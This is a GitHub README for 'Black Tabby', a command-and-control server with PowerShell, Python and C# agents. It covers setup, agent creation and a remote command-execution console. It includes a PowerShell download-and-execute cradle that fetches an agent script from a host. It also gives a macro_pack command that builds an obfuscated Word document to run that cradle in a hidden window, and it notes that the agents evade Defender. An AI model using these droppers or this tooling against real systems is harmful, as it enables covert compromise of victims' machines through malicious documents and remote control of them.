# Black Tabby

Black Tabby is a Command & Control Server written in Python with agents written in python, powershell, C#
### Prerequisites
```
Docker
Python3
```
### Setup

After docker and python3 is on your machine all you need to do is clone this repo and run the setup.sh file

```
git clone https://github.com/latortuga71/Black_Tabby.git
cd Black_Tabby
chmod +x setup.sh
pip3 -r install requirements.txt
./setup.sh
```

Then you will be asked to set the username & password for the CouchDB container and it will run on port 5984 of your local machine
It will also ask you for two secrets, a user-agent secret and an agent secret, these are very importing and are used when creating agents
so they can authenticate to your flask server. Which in turn communicates to the CouchDB container

![](https://github.com/latortuga71/Black_Tabby/blob/master/setup1.JPG)

After that has successfully completed run the following command
```
python3 BlackTabby.py
```
You will be asked for the credentials provided as well as the ip address and port that the CouchDB container is running on which should be 127.0.0.1 5984 unless you set this up to run on a different server that the CLI interface will be running on. This will create a view in CouchDB that is neccesary for the CLI to function properly.

## Agents
So far the only agents that can be created through the CLI are python and powershell, i wrote a C# agent that has my loopback hardcoded, as well as the agent secrets if this is edited to suite anyones needs then it can also be used. The C# source folder is [Here](https://github.com/latortuga71/Black_Tabby/tree/master/Agents/C%23AGENT/CSHARPAGENT)

## Droppers
In the DropperStuff folder i was able to create word doc that ran the following code as a way of executing the powershell agent.

```
IEX(New-Object Net.WebClient).downloadString('http://10.0.0.150/Agent.ps1') 
```
I came across [MacroPack](https://github.com/sevagas/macro_pack) which creates and obfuscates dropper files for you go ahead and check it out is pretty awesome. That in conjunction with [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) is a great combo. Below is command i used in macropack specifically.

```
echo "powershell.exe -windowstyle Hidden -c IEX(New-Object Net.WebClient).downloadString('http://10.0.0.150/Agent.ps1') -WindowStyle Hidden" | macro_pack.exe -t CMD -o -G  cmd.doc
```

## Creating Agents

There is an option on the CLI that allows you to create agents, it will ask you for the ip address and port it will be connecting to. In this case you do not enter the port 5984 which is CouchDB you would enter 9000 which is the flask server.
So if you are running the CLI and Server on same host, you would enter 127.0.0.1 and port 9000. After you will be asked for the two secrets specified during the bash setup script.

## Agent CLI (Work in progress)

Once you have connected to an agent just enter ? to see a list of options
* execute followed by a command will run a command and return the result
```
execute cmd
```
* get_all will return the full database document for that agent
* export json will write the json to a file.
```
export_json /tmp/json_output.txt
```

![](https://github.com/latortuga71/Black_Tabby/blob/master/setup3.JPG)

## Does it trigger antivirus tho?
As far as i know, the powershell and c# agents themselves dont trigger defender.



